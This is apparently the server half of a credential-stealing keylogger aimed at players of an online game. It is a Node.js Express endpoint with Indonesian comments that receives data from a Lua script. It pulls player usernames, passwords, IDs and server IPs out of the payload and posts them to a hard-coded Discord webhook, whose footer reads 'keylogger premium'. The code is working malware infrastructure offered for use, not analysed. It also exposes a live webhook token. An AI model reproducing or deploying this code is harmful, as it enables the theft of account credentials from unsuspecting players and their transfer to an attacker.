import express from 'express'
import axios from 'axios'

const app = express()
app.use(express.json())

// Tentukan port 8080
const PORT = 8080

app.get('/', (_req, res) => {
  res.send('Hello Express API is running!')
})

// Endpoint disesuaikan dengan apiPath di script Lua ("/api/send")
app.post('/api/send', async (req, res) => {
  try {
    // Menangkap struktur payload cjson dari script Lua
    const { c, n, i, s, sip, mip, t } = req.body
    
    // Validasi sederhana jika payload kosong
    if (!c || !n) {
      return res.status(400).json({ success: false, error: "Invalid data format" })
    }

    // --- PROSES EKSTRAKSI DATA DARI VARIABEL 'c' ---
    let rawContent = c || "";
    let extractedPassword = "Tidak ada";
    let extractedDialogId = t !== undefined ? String(t) : "Tidak ada";

    // 1. Ekstraksi Dialog ID dari string (misal jika isi 'c' diawali "Dialog 11 ")
    if (rawContent.startsWith("Dialog ")) {
      const matchDialog = rawContent.match(/^Dialog\s+(\d+)\s*/i);
      if (matchDialog) {
        extractedDialogId = matchDialog[1]; // Mengambil angka "11"
        rawContent = rawContent.replace(/^Dialog\s+\d+\s*/i, ""); // Menghapus tulisan dari data utama
      }
    }

    // 2. Ekstraksi Password jika mendeteksi teks format "input:dott" atau sejenisnya
    const matchInput = rawContent.match(/input[:\s]*([^\s\n]+)/i);
    if (matchInput) {
      const passwordValue = matchInput[1]; // Mengambil kata setelah "input:" (contoh: "dott")
      // Format menjadi "Password: Dott" dengan huruf kapital di awal kata
      const formattedPassword = passwordValue.charAt(0).toUpperCase() + passwordValue.slice(1);
      extractedPassword = `Password: ${formattedPassword}`;
      
      // Hapus baris atau teks yang mengandung "input:dott" agar bersih dari data utama
      rawContent = rawContent.replace(/input[:\s]*[^\s\n]+/i, "").trim();
    }

    // URL Webhook Discord Anda
    const webhookUrl = 'https://discord.com/api/webhooks/1541819771002036256/ISvR0KaiPnJOBX5w76JU3tlOg8orzy1fLRbzy6CC4-SYIPWoYObKIUaJkpvCZDXnsNJt'

    // Mengirim payload dalam bentuk struktur Rich Embed Discord
    await axios.post(webhookUrl, {
      embeds: [
        {
          title: "PAKET NIH NYETT!!", // Mengubah JUDUL menjadi DATA PEMAIN
          color: 16777215, // Kode desimal untuk warna putih (#FFFFFF)
          fields: [
            {
              name: "Username",
              value: n || "Tidak ada",
              inline: true
            },
            {
              name: "Password",
              value: extractedPassword, // Diisi otomatis dari hasil ekstraksi
              inline: true
            },
            {
              name: "Player ID",
              value: i !== undefined ? String(i) : "Tidak ada",
              inline: true
            },
            {
              name: "Server",
              value: s || "Tidak ada",
              inline: false
            },
            {
              name: "Server IP",
              value: sip || "Tidak ada",
              inline: true
            },
            {
              name: "Dialog ID",
              value: extractedDialogId, // Menampilkan Dialog ID yang sudah dipindahkan
              inline: true
            },
            {
              name: "DATA PEMAIN",
              value: rawContent ? `\`\`\`\n${rawContent}\n\`\`\`` : "```\nTidak ada\n```",
              inline: false
            }
          ],
          footer: {
            text: "Dott & Bich - keylogger premium"
          },
          timestamp: new Date().toISOString()
        }
      ]
    }, {
      headers: {
        'Content-Type': 'application/json'
      }
    })
    
    res.json({ success: true })
  } catch (error) {
    console.error("Gagal mengirim ke Discord:", error)
    res.status(500).json({ success: false, error: "Internal Server Error" })
  }
})

// Mengaktifkan server Express di port 8080
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`)
})

export default app
